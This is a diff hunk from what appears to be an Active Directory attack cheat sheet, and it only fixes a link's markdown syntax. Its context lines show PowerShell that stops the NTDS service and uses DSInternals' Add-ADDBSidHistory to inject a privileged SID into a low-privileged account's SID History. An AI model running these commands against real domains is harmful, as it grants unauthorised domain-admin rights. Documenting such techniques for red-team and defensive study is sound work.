@@ -89,7 +89,7 @@ for example:
       ```ps1
         Get-ADGroup "Domain Admins"
       ```      
-  - we will use the ![DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file
+  - we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file
       ```ps1
         Stop-Service -Name ntds -force
         Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
